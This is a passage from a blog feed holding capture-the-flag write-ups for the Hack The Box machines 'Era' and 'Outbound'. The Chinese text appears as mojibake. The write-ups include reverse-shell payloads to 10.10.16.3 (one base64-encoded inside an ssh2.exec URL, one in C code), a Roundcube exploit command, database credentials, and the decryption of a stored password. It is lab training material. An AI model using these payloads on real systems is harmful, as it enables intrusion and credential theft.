å¯ä»¥è¯·æ±‚å¤–éƒ¨ URLï¼ˆå‰ææ˜¯ allow_url_fopen å¼€å¯ï¼‰</span></span><br><span class="line"><span class="comment"># è¿™å°±æ„å‘³ç€å¦‚æœç®¡ç†å‘˜è´¦å·èƒ½ç™»å½•ï¼Œå°±èƒ½ç”¨ format å‚æ•°ç»“åˆ wrapper è®¿é—®åˆ°ä¸åœ¨æ­£å¸¸æ–‡ä»¶ç›®å½•ä¸‹çš„å†…å®¹ã€‚</span></span><br><span class="line"><span class="comment"># è¯´æ˜å­˜åœ¨åˆ©ç”¨ç©ºé—´ åå¼¹shell è®°å¾—æœ«å°¾åŠ ï¼› å› ä¸ºæ¯æ¬¡æ‰§è¡Œï¼Œçœ‹åˆ°å’Œfilesæ˜¯è¿ç€çš„ï¼ŒåŠ äº†ä¹‹åå°±æ‰§è¡ŒæˆåŠŸäº†</span></span><br><span class="line">http://file.era.htb/download.php?<span class="built_in">id</span>=54&amp;show=<span class="literal">true</span>&amp;format=ssh2.exec://eric:america@127.0.0.1/bash%20-c%20%27printf%20KGJhc2ggPiYgL2Rldi90Y3AvMTAuMTAuMTYuMy80NDQ0ICAwPiYxKSAm|<span class="built_in">base64</span>%20-d|bash%27;</span><br><span class="line"></span><br><span class="line"><span class="comment"># åå¼¹æˆåŠŸ</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>å…ˆæŠŠlinpeasä¼ ä¸Šå»ï¼Œæ‰§è¡Œçœ‹çœ‹å“ªäº›åœ°æ–¹å¯ä»¥ææƒã€‚<br><img src="/../images/13d70976ae93750cec08eab8e28b137fe45e7c9af23fad7788021117b5848baa.png" alt="picture 8">  </p><p>åé¢ä¸çŸ¥é“å’‹åšäº†ï¼Œç½‘ä¸Šæœåˆ°å¤§ä½¬çš„ç¬”è®°ï¼Œä¸Šä¼ pspyæŸ¥çœ‹è¿›ç¨‹ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget http://10.10.16.3:9999/pspy64</span><br><span class="line"><span class="comment"># æ‰§è¡Œ</span></span><br><span class="line">pspy</span><br></pre></td></tr></table></figure><p><img src="/../images/e965d7252e2fbdac778a6eb4453c8b8bace3246cf313fe6922e79c01064c8941.png" alt="picture 9">  </p><p>ä¸¢ç»™<code>GPT</code>ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">CRON ä»»åŠ¡æ‰§è¡Œ</span><br><span class="line">UID=0     PID=64453  | /usr/sbin/CRON -f -P </span><br><span class="line"></span><br><span class="line">root ç”¨æˆ·ï¼ˆUID=0ï¼‰è¿è¡Œçš„ CRON å®ˆæŠ¤è¿›ç¨‹</span><br><span class="line">-f è¡¨ç¤ºå‰å°è¿è¡Œ</span><br><span class="line">-P æ˜¯ CRON çš„æ—¥å¿—è¾“å‡ºæ ‡å¿—</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bash æ‰§è¡Œè„šæœ¬</span><br><span class="line">/bin/sh -c bash -c &#x27;/root/initiate_monitoring.sh&#x27; &gt;&gt; /opt/AV/periodic-checks/status.log 2&gt;&amp;1 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">CRON è°ƒç”¨ bash æ¥æ‰§è¡Œ /root/initiate_monitoring.sh</span><br><span class="line">è¾“å‡ºå’Œé”™è¯¯éƒ½é‡å®šå‘åˆ° /opt/AV/periodic-checks/status.log</span><br><span class="line">å¤šæ¡ç±»ä¼¼å‘½ä»¤æ˜¾ç¤ºè„šæœ¬è¢«é‡å¤æˆ–å‘¨æœŸæ€§è°ƒç”¨</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">objcopy</span><br><span class="line">objcopy --dump-section .text_sig=text_sig_section.bin /opt/AV/periodic-checks/monitor</span><br><span class="line"></span><br><span class="line">root è¿è¡Œçš„ objcopy å‘½ä»¤</span><br><span class="line">ä» /opt/AV/periodic-checks/monitor å¯æ‰§è¡Œæ–‡ä»¶ä¸­å¯¼å‡º .text_sig æ®µåˆ° text_sig_section.bin</span><br><span class="line">å¯èƒ½æ˜¯ AV æˆ–ç›‘æ§ç¨‹åºç”¨æ¥éªŒè¯äºŒè¿›åˆ¶å®Œæ•´æ€§</span><br><span class="line"></span><br><span class="line">ç›‘æ§ç¨‹åº</span><br><span class="line">/opt/AV/periodic-checks/monitor</span><br><span class="line">AV æˆ–ç›‘æ§ç¨‹åºè‡ªèº«æ‰§è¡Œ</span><br><span class="line">å¯èƒ½ç”± CRON è„šæœ¬è§¦å‘</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å…³é”®å°±æ˜¯ä»¥<code>root</code>æƒé™æ‰§è¡Œå’±ä»¬åå¼¹<code>shell</code>ï¼Œé‚£å°±å…ˆç¼–å†™ä¸€ä¸ªå¯æ‰§è¡Œçš„æ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># soæ–‡ä»¶</span></span><br><span class="line">file monitor</span><br><span class="line">monitor: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=45a4bb1db5df48dcc085cc062103da3761dd8eaf, <span class="keyword">for</span> GNU/Linux 3.2.0, not stripped</span><br><span class="line"></span><br><span class="line"><span class="comment"># å†™åˆ°ex.cæ–‡ä»¶ä¸­</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt; </span></span><br><span class="line">int <span class="function"><span class="title">main</span></span>() &#123; </span><br><span class="line">    system(<span class="string">&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.10.16.3/5555 0&gt;&amp;1&#x27;&quot;</span>); </span><br><span class="line">    <span class="built_in">return</span> 0; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">gcc ex.c -o ex</span><br><span class="line"></span><br><span class="line"><span class="comment"># å†æŠŠexä¼ åˆ°ç›®æ ‡æœºå™¨</span></span><br><span class="line">wget http://10.10.16.3:9999/ex </span><br><span class="line"></span><br><span class="line"><span class="comment"># è·å–.text_sigå­—æ®µ</span></span><br><span class="line">objcopy --dump-section .text_sig=text_sig_section.bin /opt/AV/periodic-checks/monitor</span><br><span class="line"><span class="comment"># æ·»åŠ å­—æ®µ</span></span><br><span class="line">objcopy --add-section .text_sig=text_sig_section.bin ex</span><br><span class="line"></span><br><span class="line"><span class="built_in">rm</span> monitor</span><br><span class="line"><span class="built_in">mv</span> ex monitor</span><br><span class="line"><span class="comment"># åŒæ—¶å¯åŠ¨ç«¯å£ç›‘å¬</span></span><br><span class="line">ncat -lvnp 5555</span><br><span class="line"></span><br><span class="line">Ncat: Version 7.97 ( https://nmap.org/ncat )</span><br><span class="line">Ncat: Listening on [::]:5555</span><br><span class="line">Ncat: Listening on 0.0.0.0:5555</span><br><span class="line">Ncat: Connection from 10.10.11.79:38388.</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (65499): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">root@era:~<span class="comment"># ls</span></span><br><span class="line">answers.sh</span><br><span class="line">clean_monitor.sh</span><br><span class="line">initiate_monitoring.sh</span><br><span class="line">monitor</span><br><span class="line">root.txt</span><br><span class="line">text_sig_section.bin</span><br><span class="line">root@era:~<span class="comment"># cat root.txt</span></span><br><span class="line">05ee929a181ae44e2282d82ff12eb7ba</span><br></pre></td></tr></table></figure><h2 id="åˆå­¦åˆ°äº†T-T"><a href="#åˆå­¦åˆ°äº†T-T" class="headerlink" title="åˆå­¦åˆ°äº†T_T"></a>åˆå­¦åˆ°äº†T_T</h2>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Era&quot;&gt;&lt;a href=&quot;#Era&quot; class=&quot;headerlink&quot; title=&quot;Era&quot;&gt;&lt;/a&gt;Era&lt;/h1&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>Pwned-Exploiting HTB Outbound</title>
    <link href="https://2in9ya2.github.io/Pwned-Exploiting-HTB-Outbound/"/>
    <id>https://2in9ya2.github.io/Pwned-Exploiting-HTB-Outbound/</id>
    <published>2025-08-25T07:52:22.812Z</published>
    <updated>2025-08-25T07:52:22.813Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Outbound"><a href="#Outbound" class="headerlink" title="Outbound"></a>Outbound</h1><span id="more"></span><h2 id="ç¬¬ä¸€æ­¥ç”¨nmapè¿›è¡Œæ‰«æ"><a href="#ç¬¬ä¸€æ­¥ç”¨nmapè¿›è¡Œæ‰«æ" class="headerlink" title="ç¬¬ä¸€æ­¥ç”¨nmapè¿›è¡Œæ‰«æ"></a>ç¬¬ä¸€æ­¥ç”¨nmapè¿›è¡Œæ‰«æ</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sC --min-rate 1000 --max-retries 1 10.10.11.73 --verbose</span><br></pre></td></tr></table></figure><p>å‘ç°æœ‰<code>22ã€80</code>ç«¯å£ã€‚<br><img src="/../images/57cd011af47f3ed3e4e5d4f8f4453f381e809e3988e5eacc84c6de690ff76f39.png" alt="picture 0"><br>é‚£å°±çœ‹çœ‹<code>80</code>ç«¯å£æœåŠ¡ï¼Œæ˜¯ä¸ªé‚®ç®±ç³»ç»Ÿï¼Œç›´æ¥æŠŠ<code>php</code>ä»£ç ç”©ç»™<code>gpt</code>ï¼Œå‘ç°ç³»ç»Ÿä¸º<code>Roundcube Webmail 1.6.10</code>ï¼Œé‚£å°±å¼€å§‹æ‰¾æ˜¯å¦å­˜åœ¨æ¼æ´ã€‚</p><p><img src="/../images/49efef24ebf6777d6e6a23970e29efa9bc377e0c7eb036248b3ce185e832bfe9.png" alt="picture 1">  </p><p>é‚£å°±å»æ‰¾<code>POC</code>ï¼Œ<a href="https://github.com/hakaioffsec/CVE-2025-49113-exploit">CVE-2025-27591-PoC</a>ã€‚</p><p>æŒ‰ç…§<code>HTB</code>çš„è´¦å·å¯†ç æç¤ºï¼Œä»¥åŠ<code>POC</code>çš„è„šæœ¬æ‰§è¡Œå‘½ä»¤ï¼Œç›´æ¥æ‰§è¡Œã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># é¦–å…ˆå¼€å¯ç›‘å¬ç«¯å£</span></span><br><span class="line">ncat -lvnp 4444</span><br><span class="line"></span><br><span class="line">php CVE-2025-49113.php http://mail.outbound.htb/ tyler LhKL1o9Nm3X2 <span class="string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.16.3/4444 0&gt;&amp;1&quot;&#x27;</span></span><br></pre></td></tr></table></figure><p>ç›´æ¥åå¼¹<code>shell</code><br><img src="/../images/a0ec942d9f59ffbe30c244c7246d4bd5d170b535ba6aec2525727c7c868ae862.png" alt="picture 2">  </p><h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p>ä¸‹ä¸€æ­¥å°±çœ‹çœ‹æœ‰å•¥èƒ½åˆ©ç”¨çš„ï¼Œå…ˆåˆ‡æ¢åˆ°æç¤ºç”¨æˆ·</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">su tyler</span><br><span class="line"><span class="comment"># çœ‹çœ‹èƒ½ä¸èƒ½åˆ›å»ºäº¤äº’å¼å‘½ä»¤è¡Œ</span></span><br><span class="line"><span class="built_in">which</span> python3</span><br><span class="line"><span class="built_in">which</span> python</span><br><span class="line"><span class="comment"># éƒ½æ²¡æœ‰æ˜¾ç¤ºï¼Œé‚£å°±ä¸è¡Œäº†ï¼Œå¦‚æœæœ‰å…¶ä»–æ–¹æ³•ï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“</span></span><br><span class="line"><span class="comment"># è¿›å…¥homeçœ‹çœ‹æœ‰å‡ ä¸ªç”¨æˆ·</span></span><br><span class="line"><span class="built_in">cd</span> /home</span><br><span class="line"><span class="built_in">ls</span> -al</span><br><span class="line">total 32</span><br><span class="line">drwxr-xr-x 1 root  root  4096 Jun  8 12:05 .</span><br><span class="line">drwxr-xr-x 1 root  root  4096 Jul  9 12:41 ..</span><br><span class="line">drwxr-x--- 1 jacob jacob 4096 Jun  7 13:55 jacob</span><br><span class="line">drwxr-x--- 1 mel   mel   4096 Jun  8 12:06 mel</span><br><span class="line">drwxr-x--- 1 tyler tyler 4096 Jun  8 13:28 tyler</span><br><span class="line"><span class="comment"># åœ¨tyleré‡Œé¢çœ‹ä¸€åœˆï¼Œå¥½åƒä¹Ÿæ²¡å•¥ä¸œè¥¿ï¼Œå†çœ‹çœ‹æœ‰å•¥èƒ½æ‰§è¡Œï¼Œå‘ç°ä¸è¡Œ</span></span><br><span class="line">sudo -l</span><br><span class="line">bash: line 25: sudo: <span class="built_in">command</span> not found</span><br><span class="line"></span><br><span class="line"><span class="comment"># é‚£å°±å»ç½‘é¡µçš„åœ°æ–¹çœ‹çœ‹</span></span><br><span class="line"><span class="built_in">cd</span> /var/www/html</span><br><span class="line"><span class="built_in">ls</span> -la</span><br><span class="line">total 28</span><br><span class="line">drwxr-xr-x 1 root     root     4096 Jun  6 18:55 .</span><br><span class="line">drwxr-xr-x 1 root     root     4096 Jun  6 18:55 ..</span><br><span class="line">-rw-r--r-- 1 root     root      615 Jun  6 18:55 index.nginx-debian.html</span><br><span class="line">drwxr-xr-x 1 www-data www-data 4096 Jun  6 18:55 roundcube</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿›åˆ°roundcubeçœ‹çœ‹</span></span><br><span class="line"><span class="built_in">cd</span> roundcube</span><br><span class="line"><span class="built_in">ls</span> -al</span><br><span class="line">total 412</span><br><span class="line">drwxr-xr-x  1 www-data www-data   4096 Jun  6 18:55 .</span><br><span class="line">drwxr-xr-x  1 root     root       4096 Jun  6 18:55 ..</span><br><span class="line">-rw-r--r--  1 www-data www-data   2553 Feb  8  2025 .htaccess</span><br><span class="line">-rw-r--r--  1 www-data www-data 216244 Feb  8  2025 CHANGELOG.md</span><br><span class="line">-rw-r--r--  1 www-data www-data  12714 Feb  8  2025 INSTALL</span><br><span class="line">-rw-r--r--  1 www-data www-data  35147 Feb  8  2025 LICENSE</span><br><span class="line">-rw-r--r--  1 www-data www-data   3853 Feb  8  2025 README.md</span><br><span class="line">-rw-r--r--  1 www-data www-data   1049 Feb  8  2025 SECURITY.md</span><br><span class="line">drwxr-xr-x  7 www-data www-data   4096 Feb  8  2025 SQL</span><br><span class="line">-rw-r--r--  1 www-data www-data   4657 Feb  8  2025 UPGRADING</span><br><span class="line">drwxr-xr-x  2 www-data www-data   4096 Feb  8  2025 bin</span><br><span class="line">-rw-r--r--  1 www-data www-data   1086 Feb  8  2025 composer.json</span><br><span class="line">-rw-r--r--  1 www-data www-data  56802 Feb  8  2025 composer.lock</span><br><span class="line">drwxr-xr-x  2 www-data www-data   4096 Jun  6 18:55 config</span><br><span class="line">-rw-r--r--  1 www-data www-data  11200 Feb  8  2025 index.php</span><br><span class="line">drwxr-xr-x  1 www-data www-data   4096 Jun 11 07:46 logs</span><br><span class="line">drwxr-xr-x 37 www-data www-data   4096 Feb  8  2025 plugins</span><br><span class="line">drwxr-xr-x  8 www-data www-data   4096 Feb  8  2025 program</span><br><span class="line">drwxr-xr-x  3 www-data www-data   4096 Jun  6 18:55 public_html</span><br><span class="line">drwxr-xr-x  3 www-data www-data   4096 Feb  8  2025 skins</span><br><span class="line">drwxr-xr-x  1 www-data www-data   4096 Aug 13 01:40 temp</span><br><span class="line">drwxr-xr-x 14 www-data www-data   4096 Feb  8  2025 vendor</span><br><span class="line"></span><br><span class="line"><span class="comment"># çœ‹åˆ°æœ‰ä¸ªconfigï¼Œçœ‹çœ‹å»</span></span><br><span class="line"><span class="built_in">cd</span> config</span><br><span class="line"><span class="built_in">ls</span> -al</span><br><span class="line">total 92</span><br><span class="line">drwxr-xr-x 2 www-data www-data  4096 Jun  6 18:55 .</span><br><span class="line">drwxr-xr-x 1 www-data www-data  4096 Jun  6 18:55 ..</span><br><span class="line">-rw-r--r-- 1 www-data www-data   164 Feb  8  2025 .htaccess</span><br><span class="line">-rw-r--r-- 1 root     root      3024 Jun  6 18:55 config.inc.php</span><br><span class="line">-rw-r--r-- 1 www-data www-data  2943 Feb  8  2025 config.inc.php.sample</span><br><span class="line">-rw-r--r-- 1 www-data www-data 65000 Feb  8  2025 defaults.inc.php</span><br><span class="line">-rw-r--r-- 1 www-data www-data  2806 Feb  8  2025 mimetypes.php</span><br><span class="line"></span><br><span class="line"><span class="comment"># çœ‹å§ï¼Œä¸€ä¸ªä¸€ä¸ªçš„</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> config.inc.php</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æŠŠå†…å®¹ç›´æ¥ç”©ç»™<code>gpt</code>ï¼Œäººå®¶éƒ½è¯´çš„å¾ˆæ˜ç™½äº†ã€‚<br><img src="/../images/3dbe5a181fa9d4c7e591c43d880f9b4f84a57bfd6bc46fcc8dbe8a62e086a3dc.png" alt="picture 4"> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å› ä¸ºæ²¡æœ‰äº¤äº’å¼ç»ˆç«¯ åªèƒ½è¿æ¥åŒæ—¶æ‰§è¡Œæ•°æ®åº“å‘½ä»¤</span></span><br><span class="line">mysql -u roundcube -p<span class="string">&#x27;RCDBPass2025&#x27;</span> -h localhost roundcube -e <span class="string">&quot;SHOW TABLES;&quot;</span></span><br><span class="line">Tables_in_roundcube</span><br><span class="line">cache</span><br><span class="line">cache_index</span><br><span class="line">cache_messages</span><br><span class="line">cache_shared</span><br><span class="line">cache_thread</span><br><span class="line">collected_addresses</span><br><span class="line">contactgroupmembers</span><br><span class="line">contactgroups</span><br><span class="line">contacts</span><br><span class="line">dictionary</span><br><span class="line">filestore</span><br><span class="line">identities</span><br><span class="line">responses</span><br><span class="line">searches</span><br><span class="line">session</span><br><span class="line">system</span><br><span class="line"><span class="built_in">users</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># çœ‹çœ‹userså§ï¼Œé‡Œé¢ä¸‰ä¸ªç”¨æˆ·ï¼Œä¹Ÿæ²¡æœ‰å¯†ç </span></span><br><span class="line">mysql -u roundcube -p<span class="string">&#x27;RCDBPass2025&#x27;</span> -h localhost roundcube -e <span class="string">&quot;SELECT * FROM users;&quot;</span></span><br><span class="line"><span class="comment"># çœ‹çœ‹session</span></span><br><span class="line"></span><br><span class="line">mysql -u roundcube -p<span class="string">&#x27;RCDBPass2025&#x27;</span> -h localhost roundcube -e <span class="string">&quot;SELECT * FROM session;&quot;</span></span><br></pre></td></tr></table></figure><p>æœ‰ä¸€ä¸²ç±»ä¼¼<code>base64</code>çš„å­—ç¬¦ä¸²ã€‚<br><img src="/../images/856537f677c78dd8327e4e763487cc6be8b605ce40956ff3415813c9be9d218d.png" alt="picture 5"><br><code>CyberChef</code>æ¥è§£ä¸€ä¸‹ï¼Œçœ‹åˆ°å¯†ç äº†ï¼Œè§£ä¸€ä¸‹ï¼Œè§£ä¸å¼€ï¼Œå‰é¢è¯´ç”¨äº†<code>DES</code>åŠ å¯†ï¼Œé—®é—®èªæ˜çš„<code>gpt</code>ã€‚<br><img src="/../images/46de738abceca77126c34978643dea1476bfed9f7bc748b4226a36698b5a4670.png" alt="picture 6">  </p><p>èªæ˜çš„<code>gpt</code>è¯´è¿™ä¸ªç”¨çš„æ˜¯3DESï¼Œé‚£å°±è¯•è¯•å‘—ï¼Œå…ˆæŠŠå¯†ç è½¬æˆ<code>HEX</code></p><p><img src="/../images/70225a4c3c815508e4ea5bd567e315c60f3c09df28cebe17718f244a7165ae98.png" alt="picture 7">  </p><p><code>key</code>å°±æ˜¯<code>rcmail-!24ByteDESkey*Str</code>ï¼Œä¸çŸ¥é“IVæ˜¯ä»€ä¹ˆã€‚é—®é—®èªæ˜çš„<code>gpt</code>ã€‚</p><p><img src="/../images/e1807f09a32ec0ffd049129f0fc83de05032e593c2d27879e1ff8a0c2152079f.png" alt="picture 8">  </p><p>ä»–è¯´<br><code>å…·ä½“æµç¨‹æ˜¯è¿™æ ·çš„ï¼ˆä»¥æ—§ç‰ˆ 3DES/rcube_crypto ä¸ºä¾‹ï¼‰ï¼š å½“ Roundcube ç”¨ des_key åŠ å¯† IMAP å¯†ç æ—¶ï¼Œä¼šéšæœºç”Ÿæˆä¸€ä¸ª 8 å­—èŠ‚çš„ IVã€‚ å®ƒæŠŠè¿™ä¸ª IV æ”¾åœ¨å¯†æ–‡çš„å‰ 8 ä¸ªå­—èŠ‚ï¼Œç„¶åå† Base64 ç¼–ç ã€‚</code><br>é‚£å°±å–å‰8ä¸ªå­—èŠ‚å‘—ã€‚è§£å‡ºæ¥æ˜¯<code>595mO8DmwGeD</code></p><p><img src="/../images/22f25d24f9043c1f5e1e16df5ad54be84ca370f0e27e621d838003cca28a0bb8.png" alt="picture 9">  </p><p>é‚£å°±è¯•è¯•å‘—ï¼Œåˆ‡æ¢ä¸‹ç”¨æˆ·<code>jacob</code>ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">su jacob</span><br><span class="line">Password: 595mO8DmwGeD</span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">jacob</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿›å»homeçœ‹çœ‹</span></span><br><span class="line"><span class="built_in">cd</span> /home/jacob</span><br><span class="line"><span class="built_in">ls</span> -la</span><br><span class="line">total 36</span><br><span class="line">drwxr-x--- 1 jacob jacob 4096 Jun  7 13:55 .</span><br><span class="line">drwxr-xr-x 1 root  root  4096 Jun  8 12:05 ..</span><br><span class="line">lrwxrwxrwx 1 root  root     9 Jun  6 19:03 .bash_history -&gt; /dev/null</span><br><span class="line">-rw-r--r-- 1 jacob jacob  220 Mar 31  2024 .bash_logout</span><br><span class="line">-rw-r--r-- 1 jacob jacob 3771 Mar 31  2024 .bashrc</span><br><span class="line">-rw-r--r-- 1 jacob jacob  807 Mar 31  2024 .profile</span><br><span class="line">drwx------ 1 jacob jacob 4096 Jul  9 12:41 mail</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æœ‰ä¸ª<code>mail</code> çœ‹çœ‹ï¼Œå‘ç°å¯†ç äº†ï¼Œ<code>ssh</code>ä¸€ä¸‹è¯•è¯•<br><img src="/../images/94032946da4166a9df85e1a0345bea53f025be8c8a3a130080136d9afeae3dd0.png" alt="picture 10"><br>è¿æ¥æˆåŠŸäº†ï¼Œçœ‹çœ‹èƒ½ä¸èƒ½ææƒåˆ°<code>root</code><br><img src="/../images/182711c3c70f1ac8c2a446b9799af8c684428973864fb4cdc70d958e65d0f497.png" alt="picture 11"><br><code>below</code>æ˜¯<code>root</code>æƒé™æ‰§è¡Œçš„ï¼Œçœ‹çœ‹å•¥ç‰ˆæœ¬<br><img src="/../images/7540bbe4720402ab1a9386a04b820efbd3afb8a43213724908dc7c9af71ba6b5.png" alt="picture 12"><br><code>0.8 </code>çœ‹çœ‹æœ‰æ²¡æœ‰<code>CVE</code>ï¼Œç»è¿‡æŸ¥è¯¢ï¼ŒçœŸæœ‰<a href="https://github.com/BridgerAlderson/CVE-2025-27591-PoC">CVE-2025-27591</a><br><img src="/../images/3032c50af8c552f46ec8fb455fd85d8324a81c0780a2fa5014be3069c6a15765.png" alt="picture 13">  </p><p>æŒ‰ç…§ç»™å‡ºçš„<code>POC</code>ï¼ŒéªŒè¯æˆåŠŸ</p><h2 id="åˆå­¦åˆ°äº†T-T"><a href="#åˆå­¦åˆ°äº†T-T" class="headerlink" title="åˆå­¦åˆ°äº†T_T"></a>åˆå­¦åˆ°äº†T_T</h2>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Outbound&quot;&gt;&lt;a href=&quot;#Outbound&quot; class=&quot;headerlink&quot; title=&quot;Outbound&quot;&gt;&lt;/a&gt;Outbound&lt;/h1&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>Finding Gozi - Unit 42 Wireshark Quiz, March 2023</title>
    <link href="https://2in9ya2.github.io/202303-Malware/"/>
    <id>https://2in9ya2.github.io/202303-Malware/</id>
    <published>2024-05-08T13:23:26.000Z</published>
    <updated>2025-08-25T07:52:22.812Z</updated>
    
